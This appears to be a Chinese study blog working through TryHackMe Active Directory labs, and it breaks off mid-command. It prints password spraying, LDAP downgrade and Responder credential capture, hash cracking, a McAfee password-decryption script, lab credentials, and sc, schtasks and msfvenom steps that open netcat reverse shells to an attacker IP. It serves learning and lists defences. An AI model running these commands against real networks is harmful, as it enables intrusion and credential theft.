的设置集合。GPO 可以包含针对用户或计算机的策略，允许您为特定的机器和身份设置基线。 要配置 GPO，可以使用 “开始 ”菜单中的 “组策略管理 ”工具： 打开它后，首先看到的是之前定义的完整 OU 层次结构。要配置组策略，首先要在组策略对象下创建一个 GPO，然后将其链接到要应用策略的 OU。举例来说，你可以看到机器中已经存在一些 GPO： 可以在 Group Policy Objects 里面看到创建的 GPO，然后对应的链接到 GPO 的地方是有一个快捷方式一样的小图标。 让我们检查一下 “默认域策略”，看看 GPO 内部有什么。选择 GPO 时看到的第一个选项卡会显示其范围，即 GPO 在 AD 中的链接位置。对于当前策略，我们可以看到它只链接到了 thm.local 域： 如您所见，您还可以对 GPO 应用安全过滤，使其只应用于 OU 下的特定用户&#x2F;计算机。默认情况下，它们将应用于 “已验证用户 ”组，其中包括所有用户&#x2F;计算机。 设置选项卡包括 GPO 的实际内容，让我们知道它适用于哪些特定配置。如前所述，每个 GPO 都有只适用于计算机的配置和只适用于用户的配置。在本例中，默认域策略只包含计算机配置： 后面就是进 GPO 编辑器改了，跟我们 gpedit.msc 一样的，不过这个会应用到应用了 GPO 的 OU 上。但是 GPO 不能直接应用在组上，但可以通过安全筛选来让它只对某个组生效。 分发 GPOGPO 通过名为 SYSVOL 的网络共享分发到网络，该共享存储在 DC 中。域中的所有用户通常都可以通过网络访问该共享，以定期同步他们的 GPO。SYSVOL 共享默认指向网络中每个 DC 上的 C:\\Windows\\SYSVOL\\sysvol\\ 目录。 一旦对任何 GPO 进行了更改，计算机可能需要长达 2 个小时的时间才能跟上。如果要强制任何特定计算机立即同步其 GPO，可以在所需计算机上运行以下命令： 1gpupdate /force 认证方式使用 Windows 域时，所有凭据都存储在域控制器中。每当用户尝试使用域凭据对服务进行身份验证时，服务都需要请求域控制器验证凭据是否正确。在 Windows 域中，有两种协议可用于网络身份验证： Kerberos 协议： 任何最新版本的 Windows 都会使用。这是任何新版域的默认协议。 NetNTLM：出于兼容性目的而保留的传统身份验证协议。 虽然 NetNTLM 应被视为过时协议，但大多数网络都会启用这两种协议。让我们深入了解一下这两种协议的工作原理。 Kerberos Authentication 用户携带用户名和用户自己的 Hash 加密过的时间戳向 KDC 请求 TGT KDC 回复一个 TGT，里面有一份 Session Key，不过是用 krbtgt 账户 Hash 加密过的。和一个使用用户 Hash 加密的 Session Key 返回给用户 当用户想请求网络上的一个服务时，会向 KDC 请求一个 TGS。发送过去的东西有 用 Session Key 加密过的用户名和时间戳 上一步 KDC 返回回来的 TGT SPN（服务主体名称） 然后 KDC 回复一个用服务所有者账户 Hash 加密的 TGS，这个 TGS 里面有 Svc Session Key。和一个用 Session Key 加密的 Svc Session Key。 当用户请求一个服务时，会发送用 Svc Session Key 加密过的用户名和时间戳。还有包含 Svc Session Key 的 TGS。 TGS 里面是有 Svc Session Key 的，然后服务器可以用它的 Hash 去解密 TGS，拿到 Svc Session Key，就能解密用户的数据包了 NetNTLM AuthenticationNetNTLM 采用挑战-响应机制工作。整个过程如下： 客户端向想要访问的服务器发送验证请求。 服务器会生成一个随机数，并将其作为挑战发送给客户端。 客户端将其 NTLM 密码哈希值与挑战（及其他已知数据）相结合，生成对挑战的响应，并将其发送回服务器进行验证。 服务器将挑战和响应转发给域控制器进行验证。 域控制器使用挑战重新计算响应，并将其与客户端发送的原始响应进行比较。如果两者匹配，则客户端通过验证；否则，拒绝访问。身份验证结果将发回服务器。 服务器将验证结果转发给客户端。 请注意，为了安全起见，用户密码（或哈希值）绝不会通过网络传输。 注意：所述过程适用于使用域帐户的情况。如果使用的是本地账户，服务器可自行验证对挑战的响应，而无需与域控制器交互，因为服务器的 SAM 上本地存储有密码哈希值。 Trees, Forests and Trusts随着公司的发展，其网络也在不断发展。开始时，公司拥有一个域名就足够了，但随着时间的推移，一些额外的需求可能会促使你拥有多个域名。 树 Trees例如，设想一下，您的公司突然扩展到一个新的国家。新的国家有不同的法律法规，要求您更新 GPO 以符合规定。此外，您现在在两个国家都有 IT 人员，每个 IT 团队都需要在不干扰其他团队的情况下管理与每个国家相对应的资源。虽然您可以创建复杂的 OU 结构并使用授权来实现这一目标，但庞大的 AD 结构可能难以管理，而且容易出现人为错误。 幸运的是，Active Directory 支持整合多个域，这样您就可以将网络划分为可以独立管理的单元。如果您有两个共享相同名称空间的域，那么这两个域可以连接成一棵树。 如果我们的 thm.local 域被分为英国和美国分支的两个子域，则可以建立一个树状结构，其中包括一个根域 thm.local，以及名为 uk.thm.local 和 us.thm.local 的两个子域，每个子域都有自己的 AD、计算机和用户： 这种分区结构可以让我们更好地控制谁可以访问域中的哪些内容。英国的 IT 人员将有自己的 DC，只管理英国的资源。例如，英国用户将无法管理美国用户。这样，每个分支机构的域管理员就可以完全控制各自的 DC，但不能控制其他分支机构的 DC。还可以为树状结构中的每个域独立配置策略。 在谈及树和林时，需要引入一个新的安全组。企业管理员组将授予用户对企业所有域的管理权限。每个域仍有域管理员，他们对自己的单个域拥有管理员权限，而企业管理员则可以控制企业中的一切。 森林 Forests您管理的域也可以配置在不同的命名空间中。假设贵公司不断发展壮大，最终收购了另一家名为 MHT Inc. 两家公司合并后，每家公司可能会有不同的域树，分别由各自的 IT 部门管理。将多个具有不同命名空间的域树合并到同一网络中称为森林。 信任关系 Trust Relationships将多个域以树和森林的形式组织起来，可以在管理和资源方面形成一个良好的分隔网络。但在某些情况下，THM UK 的用户可能需要访问 MHT ASIA 服务器中的某个共享文件。为此，以树和森林形式排列的域通过信任关系连接在一起。 简单地说，域之间的信任关系允许您授权域 THM UK 的用户访问域 MHT EU 的资源。 可以建立的最简单的信任关系是单向信任关系。在单向信任关系中，如果网域 AAA 信任网域 BBB，这就意味着可以授权 BBB 上的用户访问 AAA 上的资源： 单向信任关系的方向与访问方向相反。 也可以建立双向信任关系，允许两个域相互授权对方的用户。默认情况下，在树或森林下连接多个域将形成双向信任关系。 需要注意的是，域之间建立信任关系并不会自动授予访问其他域上所有资源的权限。一旦建立了信任关系，你就有机会授权不同域的用户，但授权与否取决于你。 Breaching Active Directory首先是配置网络，说实话有点麻烦，要下官方他提供的那个专门用于 AD 域的配置文件，还要把系统的 DNS 覆盖掉。 12345sudo vim /etc/resolv.conf # 锁定和解锁文件 chattr +i /etc/resolv.conf chattr -i /etc/resolv.conf 其他的倒是没啥了，不过发现 223.5.5.5 在我网络环境下面死掉了。 并不是，是他自己死了：https://www.v2ex.com/t/1149042 密码喷洒这一节提了一下 NTLM 和 NetNTLM 概念，后者是接收到用户凭据之后，发送到 DC 服务器去认证，认证不在这个机器上进行而是在 DC 上做的。 密码喷洒意思是：用一个已知的密码去尝试其他的用户登录，用这种方式能避免被发现，如果爆破的话动静很大。 1234python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ # Python 用这条命令安装缺的库 pip install requests_ntlm --break-system-packages LDAP 回传攻击这一节就是通过模拟 LDAP 服务器，强制降级认证方式然后从通信上截取明文密码，我觉得这里应该有开源的轮子。 题目是给了一个打印机服务器，密码不是明文存储的，但是我们可以通过修改他的服务器地址去截获他。 然后我们要搭建一个 LDAP 服务器，这里用的是 SLAPD。 1234# 安装 sudo apt-get update &amp;&amp; sudo apt-get -y install slapd ldap-utils &amp;&amp; sudo systemctl enable slapd # 配置 sudo dpkg-reconfigure -p low slapd 然后要让认证降级成明文的，用到这样一个配置文件。 1234#olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred 1234567891011# 应用配置文件 sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart # 测试配置文件 ldapsearch -H ldap:// -x -LLL -s base -b &quot;&quot; supportedSASLMechanisms # dn: # supportedSASLMechanisms: PLAIN # supportedSASLMechanisms: LOGIN # 抓包 sudo tcpdump -SX -i breachad tcp port 389 认证中继这一节讲述的是，在 Windows 机器的网络下面，很多服务会互相通信，允许用户使用这些网络中提供的服务。而这些服务会用身份验证方法去验证身份，这就让我们有了可乘之机，可以去抓取这些数据包去破解。 Server Message Block (SMB)在早期版本的 SMB 中安全性不足，有很多漏洞和利用点，尽管漏洞在新版中解决了，但是因为旧系统不支持这些版本或者其他原因，导致没有强制升级到最新版。 抓 NTLM Challenge 包，离线破解，但是比直接爆破 NTLM hash 慢很多 可以自建服务器做 MTIM 攻击，截获认证成功的 session LLMNR, NBT-NS, and WPAD在现实局域网上会有很多 NetNTLM challenge，有时因为过期的 DNS 记录，这些数据包可能会发到你伪造的服务器上。 文章介绍了一个 Responder 工具，他可以去实现 MITM。 在真实的局域网（LAN）中，Responder 会尝试投毒它检测到的任何链路本地多播名称解析、NetBIOS 名称服务 和 Web 代理自动发现请求。 在大型 Windows 网络中，这些协议能让主机去自己发现主机，而不是去请求 DNS 服务器，这些协议就类似于 DNS 一样的，不过他的行为更像 ARP。主机可以首先尝试通过发送 LLMNR (Link-Local Multicast Name Resolution) 请求，并查看是否有任何主机响应，来确定它们要查找的主机是否在同一个本地网络上。 NBT-NS (NetBIOS Name Service) 是 LLMNR 的前身协议，而 WPAD (Web Proxy Auto-Discovery) 请求是为了尝试查找未来 HTTP(s) 连接的代理服务器而发出的。 由于这些协议依赖于在本地网络中广播的请求，所以我们的恶意设备也能收到这些请求。通常，这些请求因为不是发给我们的主机，就会被简单地丢弃。然而，Responder 会积极监听这些请求，并发送伪造的响应，告诉发起请求的主机：我们的 IP 地址就是它想要连接的主机名对应的地址。通过投毒这些请求，Responder 试图强制客户端连接到我们的 攻击机。与此同时，它还会启动并托管多个服务器，比如 SMB、HTTP、SQL 等，以便捕获这些连接请求并强制进行身份验证，然后我们能直接抓到凭据或者是 hash。 拦截 NetNTLM因为 Responder 是通过 race condition（比服务器更快响应给客户端）去给连接投毒的，这样我们才能拦截到这个连接。 还要小心 Responder 会干扰到正常业务，或者被检测到。 1234sudo python responder.py -I breachad # 记得关掉前面开的 SLAPD sudo service slapd stop 然后过一会就抓到 Hash 了，直接丢进 Hashcat 爆破。5600 是 NetNTLMv2，不同的 Hash 种类可以在这里看。 1echo &quot;svcFileCopy::ZA:d1fbc574572a06d8:AC7426941099D79E45ED19E4BBEB34BC:010100000000000000AB4DF0E601DC01817050186B6BCBB900000000020008004B0049004D00560001001E00570049004E002D004C00550038004800480044005900460032003200310004003400570049004E002D004C0055003800480048004400590046003200320031002E004B0049004D0056002E004C004F00430041004C00030014004B0049004D0056002E004C004F00430041004C00050014004B0049004D0056002E004C004F00430041004C000700080000AB4DF0E601DC01060004000200000008003000300000000000000000000000002000003EA8D95F89C068EA81D77546006E5A06B91A2AA73F678D23068A0A89689CD7400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00310038002E0037000000000000000000&quot; &gt; hash.txt &amp;&amp; hashcat -m 5600 -a 0 hash.txt ./passwordlist-1647876320267.txt --force SMB Relay 中继如果 SMB 开了签名就寄了，可以通过 SMB 中继把认证成功的截获，然后以这个用户的身份去访问那些文件。 推荐房间：https://tryhackme.com/room/hololive 看了一下，这房间覆盖面好广，之后再来探索吧。 微软部署工具包介绍了一下 Microsoft Deployment Toolkit (MDT) 和 Microsoft’s System Center Configuration Manager (SCCM)，MDT 是集成在 SCCM 里面的，这俩是自动化安装系统&#x2F;打补丁工具，但是没有说具体实现，介绍一下思路。 从镜像文件中提取凭据提了一下 MDT 可以用来管理 PXE 启动，题目的意思就是我们可以拿到他的配置文件，然后找到那个安装镜像，里面会存着用于配置系统的账户和密码，BCD 文件可以用 PowerPXE 提取里面的信息。 12345678910111213# 取回 bcd 文件 tftp -i 10.200.20.202 GET &quot;\\Tmp\\x64{0620E466-5D23-4890-A8C2-3E89E9A4E777}.bcd&quot; conf.bcd # 进入 PowerShell 环境 powershell -executionpolicy bypass # 载入 PowerShell 脚本 Import-Module .\\PowerPXE.ps1 $BCDFile = &quot;conf.bcd&quot; Get-WimFile -bcdFile $BCDFile &gt;&gt; Parse the BCD file: conf.bcd &gt;&gt;&gt;&gt; Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim \\Boot\\x64\\Images\\LiteTouchPE_x64.wim 这里找到了一个启动镜像文件，下载下来然后用 PowerPXE 脚本提取信息，或者可以手动解包镜像之后找到 bootstrap.ini 查看。 12345678tftp -i 10.200.20.202 GET &quot;\\Boot\\x64\\Images\\LiteTouchPE_x64.wim&quot; pxeboot.wim -v Get-FindCredentials -WimFile pxeboot.wim &gt;&gt; Open pxeboot.wim &gt;&gt;&gt;&gt; Finding Bootstrap.ini &gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\\\THMMDT\\MTDBuildLab$ &gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = &lt;account&gt; &gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserDomain = ZA &gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = &lt;password&gt; 关于 PXE 提取信息相关可以看这个：https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/ 配置文件这个也是老生常谈了，也是信息收集技能的一环，文章提到了以下几个地方可能会存着凭据。 Web 应用程序配置文件 服务配置文件 注册表 集中部署的应用程序 浏览器 另外也可以用这个自动化工具 Seatbelt 去提取。 从迈克菲杀毒中提取凭据McAfee 在安装过程中，会将用于连接回其管理服务器的凭据嵌入在一个名为 ma.db 的文件中。拥有本地主机访问权限后，可以检索并读取这个数据库文件，从而恢复相关的 AD 服务账户。 1234567cd C:\\ProgramData\\McAfee\\Agent\\DB dir # 通过 SCP 把文件传到本地 scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db . # 打开迈克菲的 SQLite 数据库 sqlitebrowser ma.db 打开 AGENT_REPOSITORIES 表，提取加密后的密码，用下面这个脚本解密。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python # Info: # McAfee Sitelist.xml password decryption tool # Jerome Nokin (@funoverip) - Feb 2016 # More info on https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/ # # Quick howto: # Search for the XML element &lt;Password Encrypted=&quot;1&quot;&gt;...&lt;/Password&gt;, # and paste the content as argument. # ########################################################################### import sys import base64 # 原脚本是用的 Cryptodome # https://pypi.org/project/pycryptodome/ # 从这里看的话，pycryptodome 包安装之后是在 Crypto 底下的 from Crypto.Cipher import DES3 from Crypto.Hash import SHA # hardcoded XOR key KEY = bytearray.fromhex(&quot;12150F10111C1A060A1F1B1817160519&quot;).decode(&quot;utf-8&quot;) def sitelist_xor(xs): result = bytearray(0) for i, c in enumerate(xs): cb = c.to_bytes(1, byteorder=&quot;big&quot;) result += (ord(cb) ^ ord(KEY[i%16])).to_bytes(1, byteorder=&quot;big&quot;) return result def des3_ecb_decrypt(data): # hardcoded 3DES key key = SHA.new(b&#39;&lt;!@#$%^&gt;&#39;).digest() + bytearray(4) # decrypt des3 = DES3.new(key, DES3.MODE_ECB) data += bytearray(64 - (len(data) % 64)) decrypted = des3.decrypt(data) return decrypted[0:decrypted.find(0)] or &quot;&lt;empty&gt;&quot; if __name__ == &quot;__main__&quot;: if len(sys.argv) != 2: print(&quot;Usage: %s &lt;base64 passwd&gt;&quot; % sys.argv[0]) print(&quot;Example: %s &#39;jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==&#39;&quot; % sys.argv[0]) sys.exit(0) # read arg encrypted_password = base64.b64decode(bytes(sys.argv[1], &quot;utf-8&quot;)) # decrypt passwdXOR = sitelist_xor(encrypted_password) password = des3_ecb_decrypt(passwdXOR).decode(&quot;utf-8&quot;) # print out print(&quot;Crypted password : %s&quot; % sys.argv[1]) print(&quot;Decrypted password : %s&quot; % password) sys.exit(0) python 这个环境不太明白，我在 Kali 中安装包老是提示要我加 --break-package-system 看了这个帖子 Is it bad to use pip install –break-package-system? 发现确实不行，系统有一部分是依赖那些包的，如果升级或者安装把包搞挂了，系统也炸了，解决办法是用虚拟环境来解决，不太懂怎么用，之后去学学。 1234# 如果提示缺库，安装这个 py -m pip install pycryptodome py mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== DLC - Python 虚拟环境虚拟环境（Virtual Environment） 是一个独立、隔离的 Python 运行环境。它的核心思想是： 隔离性： 每个虚拟环境都有自己独立的 Python 解释器、pip 工具和 site-packages 目录。 互不干扰： 当你在一个虚拟环境中安装包时，这些包只会安装到这个虚拟环境的 site-packages 目录中，不会影响到系统全局的 Python 环境。 项目专用： 你可以为每个 Python 项目创建一个独立的虚拟环境，这样不同项目之间所需的依赖库版本就不会冲突。 1234567891011121314# 建立项目目录 mkdir my_project cd my_project # 创建虚拟环境 # 这个命令会在当前目录下创建一个名为 YOUR_venv_NAME 的子目录 python3 -m venv YOUR_venv_NAME # 激活虚拟环境 source venv/bin/activate # 安装依赖，会安装到虚拟环境中，而不会安装到系统全局的 Python pip install requests_ntlm pip install pycryptodome 总结AD 的攻击面非常大，可以从以下几个方面去缓解： 培训用户意识 控制 AD 服务暴露面 不要暴露在外网，仅在内网可访问并且启用 MFA 的 VPN 启用 NAC 网络访问控制 强制 SMB 签名 遵守最小权限原则 Enumerating Active Directory这一个房间其实是讲信息收集的，从很多个面，很多种方法去收集信息 根据房间去设置好网卡的 DNS 后，去获取一组凭据。 rachael.atkinson Password: Zjqf3489 1ssh za.tryhackme.com\\\\rachael.atkinson@thmjmp1.za.tryhackme.com 凭据注入这里用到的是 Runas.exe /netonly ，刚开始不明白他的作用是什么，以为是以域上的用户的权限去执行程序的，实际上是用提供的域和凭据注入一个临时的应用程序，之后执行的网络操作都用的这个凭据去执行。 123runas.exe /netonly /user:za.tryhackme.com\\rachael.atkinson cmd.exe dir \\\\za.tryhackme.com\\SYSVOL\\ 可以看到标题栏有 作为 xxxx 运行 的提示。 DNS 解析不到域控实际上是一个 Windows 下的优先级的问题，因为我外网网卡的跃点数比 OpenVPN 网卡的接口跃点数大，所以 DNS 优先用外置网卡的 DNS 去查询，当然查不到结果。通过调小 OpenVPN 的网卡的跃点数解决。 123456789101112131415161718192021222324252627# NS 手动查询 DNS nslookup za.tryhackme.com 服务器: 10.1.2.1 Address: 10.1.2.1 *** 10.1.2.1 找不到 za.tryhackme.com: Non-existent domain # 查看系统内 DNS netsh interface ip show dns # 查看接口跃点数 netsh interface ipv4 show interface Idx Met MTU 状态 名称 --- ---------- ---------- ------------ --------------------------- 13 25 1500 connected 本地连接 2 7 20 1500 connected 以太网 7 # 调小跃点数后查询 DNS 解析 nslookup thmjmp1.za.tryhackme.com DNS request timed out. timeout was 2 seconds. 服务器: UnKnown Address: 10.200.68.101 名称: thmjmp1.za.tryhackme.com Address: 10.200.68.248 IP 和 域名 当使用域名（hostname）访问时，首选的认证协议是 Kerberos。这是因为 Kerberos 的设计就是基于服务主体名称（Service Principal Name, SPN），它需要主机名才能正常工作。 当使用 IP 地址访问时，Kerberos 认证会失败，因为它无法为 IP 地址构建有效的 SPN。在这种情况下，Windows 会回退（fall back） 到 NTLM 认证。 Enumeration 枚举这一块就介绍了几种方式去收集 AD 中相关信息的方法。 MMC即 Microsoft Management Console，如果是远程管理的话，要装一个 RAST 的组件。 如果是本地访问远端的域，不能直接在 runas 好的 cmd 中运行，要重新开始。 12# 本地运行 runas.exe /netonly /user:za.tryhackme.com\\rachael.atkinson mmc 然后添加管理单元，把三个 AD 域的都勾上，再返回到主页右键加好的那些单元，都把域名指定好。 优点 全面的视图：图形用户界面提供了一个极好的方法来全面了解活动目录（AD）环境。 快速搜索：可以对不同的活动目录对象进行快速搜索。 直接查看更新：它提供了一种直接的方法来查看特定活动目录对象的更新。 直接修改：如果我们有足够的权限，可以直接更新现有的活动目录对象或添加新的对象。 缺点 需要远程桌面访问：图形用户界面需要在执行它的机器上进行远程桌面协议（RDP）访问。 无法广域收集：虽然搜索单个对象很快，但无法进行全活动目录范围的属性或特征收集。 CMD注意⚠️：这个不能用 runas 来远程操作 1234567891011121314# 显示域中所有用户 net user /domain # 查看某个用户的信息 net user zoe.marshall /domain # 查看域中所有的组 net group /domain # 查看组中的成员 net group &quot;Tier 1 Admins&quot; /domain # 查看密码策略 net accounts /domain 密码策略可以帮助我们更好地猜测在攻击中应该使用哪些单个密码，密码错误多少次锁定账户，又或者是锁定账户的时间。 优点 无需额外工具：不需要安装任何额外的或外部工具，并且这些简单的命令通常不会被蓝队（Blue team，指安全防御团队）监控到。 无需图形界面：我们不需要图形用户界面（GUI）就可以进行这种枚举。 支持宏语言：VBScript 和其他常用于钓鱼攻击（phishing payloads）的宏语言原生支持这些命令，因此可以在制作更具体的恶意负载之前，用来枚举关于活动目录（AD）域的初始信息。 缺点 需要加入域：net 命令必须在已加入域（domain-joined）的机器上执行。如果机器没有加入域，它将默认显示 WORKGROUP（工作组）域的信息。 信息不完整：net 命令可能无法显示所有信息。例如，如果一个用户是超过十个群组的成员，输出结果中将不会显示所有这些群组。 PowerShellPowerShell 是 cmd 的升级版，最大的区别是提供了 cmdlets（类似方法调用），关于 AD 的 cmdlets 可以参考这个：https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps 12345678910111213141516171819202122232425262728# 获取用户的所有属性 # -Properties * 是展示出所有的属性，另外可以手动指定 Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties * # 可以通过这种方法去过滤出需要的用户和要的信息 Get-ADUser -Filter &#39;Name -like &quot;*stevens&quot;&#39; -Server za.tryhackme.com | Format-Table Name,SamAccountName -A # 查看所有 AD 组 Get-ADGroup -Filter * -Server za.tryhackme.com # 查看 Administrators 组信息 Get-ADGroup -Identity Administrators -Server za.tryhackme.com # 查看 AD 组成员 Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com # 获取 AD 对象 $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00) Get-ADObject -Filter &#39;whenChanged -gt $ChangeDate&#39; -includeDeletedObjects -Server za.tryhackme.com # 找到错误密码次数大于 0 的用户 Get-ADObject -Filter &#39;badPwdCount -gt 0&#39; -Server za.tryhackme.com # 获取 AD 域的信息 Get-ADDomain -Server za.tryhackme.com # 给域内用户改密码 Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext &quot;old&quot; -force) -NewPassword (ConvertTo-SecureString -AsPlainText &quot;new&quot; -Force) 优点 信息量更大：PowerShell 的 cmdlet（命令行工具）可以比命令提示符中的 net 命令枚举出多得多的信息。 支持远程执行：即使在未加入域的机器上，我们也可以通过 runas 命令来指定服务器和域，从而执行这些命令。 自定义 cmdlet：我们可以创建自己的 cmdlet 来枚举特定的信息。 直接修改对象：我们可以使用 AD-RSAT cmdlet 直接修改 AD 对象，例如重置密码或将用户添加到特定组。 缺点 更容易被监控：与命令提示符相比，PowerShell 通常受到蓝队（安全防御团队）更多的监控。 需要安装工具：我们必须安装 AD-RSAT 工具，或者使用其他可能更容易被检测到的脚本来进行 PowerShell 枚举。 Bloodhound一种图形化分析工具，能图形化的分析域内的信息。然后要用到一个 Sharphound 工具，他是用来收集信息的。 1Sharphound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs CollectionMethods：第一次运行之后， 如果只要收集 Session，只运行 Session 即可。也就是提取用户当前登录机器的会话 Domain：指定要收集的域 ExcludeDcs：让工具不要去操作 DC，容易引起警报 Bloodhound 依赖 neo4j 数据库，初次使用要部署一下，然后就是软件的基本使用了。这里用的是 v4 版本，说实话不好用，而且文档也不见了，新版的 Bloodhound 又分为社区版和商业版，之后再去研究，感觉用不上（我错了）。 优点 提供图形化界面：为活动目录（AD）枚举提供了图形用户界面。 展示攻击路径：能够展示已枚举的活动目录信息中的潜在攻击路径。 更深入的洞察：提供了对活动目录对象更深入的洞察，这些信息通常需要通过多次手动查询才能获取。 缺点 需要执行 Sharphound：它的使用需要执行 Sharphound，这个过程会产生较多噪音，并且常常会被防病毒（AV）或端点检测与响应（EDR）解决方案检测到。 总结枚举 AD 是一项庞大的工作。为了更好地理解域的内部结构，并找出可以利用来进行特权提升或横向移动的攻击路径，进行全面的 AD 枚举是必不可少的。 其他的枚举技术 LDAP 枚举 PowerView 缓解措施 监控事件 AD 枚举技术会产生一堆 logon 事件，都是从一个 AD 用户发起的，能编写一个检测规则去识别这种攻击 检测特定软件的签名 监控 CMD 和 PowerShell Lateral Movement and Pivoting房间：https://tryhackme.com/room/lateralmovementandpivoting 时间：20250803 14:00 - 20250804 15:00 这个房间是教横向移动的，也就是从系统里面提取高权限账户，达到拿下高权限机器的作用，主要用的是 Hash 提取，还有 Kerberos。 本地账户只能通过 RDP 去操作有 UAC 的行为，类似 RPC&#x2F;SMB&#x2F;WinRM 之类的操作渠道不行，但是域账户不受限制，还有默认的 Administrator 用户。 远程执行进程下面的技术都有不同的方法去实现相同的目的，有一些可能更加适合某些场景。 Psexec Ports: 445&#x2F;TCP (SMB) Required Group Memberships: Administrators Psexec 是多年来远程执行命令的首选，他允许管理员用户在其可访问的 PC 上远程执行命令，他是许多系统工具之一。 他的工作流如下：连接到 $Admin 共享文件夹上传可执行的服务（PSEXESVC.exe） -&gt; 创建然后执行服务（C:\\Windows\\psexesvc.exe） -&gt; 创建一个管道（\\.\\pipe\\psexesvc\\） 运行 psexec 我们只需要提供管理员的凭据和要运行的命令，如下。 12345psexec64.exe \\\\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe # 使用 impacket 的 psexec # https://feifei.tw/impacket/ python3 psexec.py ZA.TRYHACKME.COM/t1_leonard.summers:EZpass4ever@THMIIS.za.tryhackme.com 参考链接：https://learn.microsoft.com/en-us/sysinternals/downloads/psexec 使用 WinRM 创建远程进程 Ports: 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS) Required Group Memberships: Remote Management Users 他是一个基于 Web 的协议，可以远程发送 Powershell 命令给 Windows 主机。大多数 Windows Server 会默认开启 WinRM。 123456789101112131415# 通过 CMD 连接到远端 PowerShell 会话 winrs.exe -u:ZA.TRYHACKME.COM\\t1_leonard.summers -p:EZpass4ever -r:THMIIS.za.tryhackme.com cmd # 通过 PowerShell 连接到远端 PowerShell 会话 # 凭证需要处理一下 $username = &#39;ZA.TRYHACKME.COM\\t1_leonard.summers&#39;; $password = &#39;EZpass4ever&#39;; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; # 传递凭证连接到远端 Enter-PSSession -Computername THMIIS.za.tryhackme.com -Credential $credential # 直接在远端执行命令并且回显 Invoke-Command -Computername THMIIS.za.tryhackme.com -Credential $credential -ScriptBlock {whoami} 通过 sc 远程创建服务 Ports: 135&#x2F;TCP, 49152-65535&#x2F;TCP (DCE&#x2F;RPC) 445&#x2F;TCP (RPC over SMB Named Pipes) 139&#x2F;TCP (RPC over SMB Named Pipes) Required Group Memberships: Administrators Windows 服务也可以被用来执行任意命令，因为它们在启动时就会运行一个命令。虽然服务的可执行文件在技术上与常规应用程序不同，但如果我们配置一个 Windows 服务去运行任何应用程序，它仍然会执行它，然后在执行结束后失败。并不是没有执行成功，是因为服务没有收到预期的服务控制信号而报错。 sc 的连接过程sc 会尝试通过 RPC 多种方式连接到 Service Control Manager (SVCCTL) DCE&#x2F;RPC 协议连接。客户端会首先连接到 135 端口上的 Endpoint Mapper (EPM)。EPM 就像一个可用 RPC 端点的目录，客户端会向它查询 SVCCTL 服务的相关信息。随后，EPM 会回复连接 SVCCTL 服务的 IP 地址和端口号，这个端口号通常是 49152-65535 范围内的动态端口。 如果后续的那个 RPC 连接失败，sc 就会尝试通过 SMB 命名管道去请求 SVCCTL，445 端口或者 139（SMB over NetBIOS）。 123456789101112131415# 通过 sc 创建用户示例 # 注意等号后面带空格是 sc 的特性 sc.exe \\\\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto sc.exe \\\\TARGET start THMservice # 利用 nc 反弹一个 shell 示例 # 首先凭据注入一下 让注入好凭据的 shell 弹到我们的攻击机上 runas /netonly /user:ZA.TRYHACKME.COM\\t1_leonard.summers &quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 4443&quot; # 再在 Shell 里面通过 sc 给目标机器创建服务 sc.exe \\\\THMIIS.za.tryhackme.com create THMserviceRe binPath= &quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 4444&quot; start= auto sc.exe \\\\THMIIS.za.tryhackme.com start THMserviceRe # 停止和删除服务 sc.exe \\\\TARGET stop THMservice sc.exe \\\\TARGET delete THMservice 通过 schtasks 远程创建计划任务12345678910# /sc 是计划的类型 ONCE 是执行一次 # 因为我们是手动执行他，所以时间不重要 schtasks /s THMIIS.za.tryhackme.com /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;c:\\tools\\nc64.exe -e cmd.exe 10.50.46.241 4444&quot; /sc ONCE /sd 01/01/1970 /st 00:00 # 手动运行计划任务 # 因为是计划任务，所以命令的回显不会显示 schtasks /s THMIIS.za.tryhackme.com /run /TN &quot;THMtask1&quot; # 删除计划任务 schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F 实践1234567891011121314151617181920212223# 创建服务小马 msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.241 LPORT=4444 -o myservice666.exe # 传小马 smbclient -c &#39;put myservice666.exe&#39; -U t1_leonard.summers -W ZA &#39;//thmiis.za.tryhackme.com/admin$/&#39; EZpass4ever # 创建好 handler msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 